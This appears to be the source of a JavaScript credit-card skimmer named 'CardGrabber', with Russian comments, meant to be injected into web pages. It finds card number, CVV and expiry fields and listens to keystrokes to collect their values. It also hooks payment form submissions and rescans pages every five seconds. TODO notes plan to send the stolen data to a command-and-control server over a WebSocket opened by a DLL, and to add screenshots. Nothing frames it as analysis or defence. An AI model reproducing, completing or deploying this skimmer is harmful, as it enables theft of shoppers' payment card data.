console.log('[CardGrabber] Injected and running.');

const cardKeywords = ['card', 'pan', 'account', 'cred', 'ccnum', 'number'];
const cvvKeywords = ['cvv', 'cvc', 'csc', 'secure', 'security', 'code'];
const expKeywords = ['exp', 'expiry', 'expiration', 'date', 'mm', 'yy'];

function findInputs() {
    const inputs = document.querySelectorAll('input, select');
    const foundFields = {
        cardNumber: null,
        cvv: null,
        expMonth: null,
        expYear: null,
        other: {}
    };

    inputs.forEach(input => {
        const name = (input.name || '').toLowerCase();
        const id = (input.id || '').toLowerCase();
        const placeholder = (input.placeholder || '').toLowerCase();
        const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
        const autocomplete = (input.getAttribute('autocomplete') || '').toLowerCase();
        const combined = `${name} ${id} ${placeholder} ${ariaLabel} ${autocomplete}`;

        let matched = false;

        if (cardKeywords.some(keyword => combined.includes(keyword))) {
            if (!foundFields.cardNumber) { // Берем первое совпадение для номера карты
                foundFields.cardNumber = input;
                matched = true;
                console.log('[CardGrabber] Found potential card number field:', input);
                attachListener(input, 'cardNumber');
            }
        } else if (cvvKeywords.some(keyword => combined.includes(keyword))) {
            if (!foundFields.cvv) { // Берем первое совпадение для CVV
                foundFields.cvv = input;
                matched = true;
                console.log('[CardGrabber] Found potential CVV field:', input);
                attachListener(input, 'cvv');
            }
        } else if (expKeywords.some(keyword => combined.includes(keyword))) {
            if (combined.includes('month') || combined.includes('mm')) {
                 if (!foundFields.expMonth) {
                    foundFields.expMonth = input;
                    matched = true;
                    console.log('[CardGrabber] Found potential expiration month field:', input);
                    attachListener(input, 'expMonth');
                 }
            } else if (combined.includes('year') || combined.includes('yy')) {
                if (!foundFields.expYear) {
                    foundFields.expYear = input;
                    matched = true;
                    console.log('[CardGrabber] Found potential expiration year field:', input);
                    attachListener(input, 'expYear');
                }
            } else if (!foundFields.expMonth && !foundFields.expYear) { // Общее поле даты
                // Можно попробовать обработать как одно поле, но пока просто логируем
                 console.log('[CardGrabber] Found potential generic expiration field:', input);
                 // attachListener(input, 'expDate'); // TODO: Handle combined date
                 matched = true;
            }
        }

        // Сохраняем остальные поля ввода на всякий случай, если они часть формы
        if (!matched && input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.type !== 'checkbox' && input.type !== 'radio') {
            const key = name || id || `other_${Object.keys(foundFields.other).length}`;
            if (!foundFields.other[key]) { // Avoid duplicates somewhat
                 foundFields.other[key] = input;
                // attachListener(input, `other_${key}`); // Возможно, тоже надо слушать?
            }
        }
    });

    // Дополнительно ищем формы оплаты
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        const formContent = form.innerText.toLowerCase() + form.outerHTML.toLowerCase();
        if (formContent.includes('payment') || formContent.includes('checkout') || cardKeywords.some(k => formContent.includes(k))) {
            console.log('[CardGrabber] Found potential payment form:', form);
            // Можно повесить слушатель на submit формы
            form.addEventListener('submit', (event) => {
                console.log('[CardGrabber] Payment form submitted. Current data:', grabbedData);
                // TODO: Send data to C2 before submission or prevent submission?
            }, true); // Use capture phase
        }
    });
}

let grabbedData = {};

function attachListener(element, fieldType) {
    const eventType = (element.tagName === 'SELECT') ? 'change' : 'input';
    element.addEventListener(eventType, (event) => {
        grabbedData[fieldType] = event.target.value;
        console.log(`[CardGrabber] Data updated:`, grabbedData);
        // TODO: Send data to C2 here (e.g., via WebSocket established by DLL)
    });
    // Также сохраним начальное значение, если оно есть
    if(element.value) {
         grabbedData[fieldType] = element.value;
    }
}

// Ищем поля сразу и потом периодически (для динамически загружаемого контента)
findInputs();
setInterval(findInputs, 5000); // Проверяем каждые 5 секунд

// TODO:
// 1. Реализовать отправку grabbedData на C2.
// 2. Обработать случаи, когда данные карты вводятся в несколько полей (например, 4 поля по 4 цифры).
// 3. Улучшить логику поиска полей (учесть iframe, shadow DOM).
// 4. Добавить логику для авто-скриншотов.
// 5. Очищать grabbedData после успешной отправки или сабмита формы. 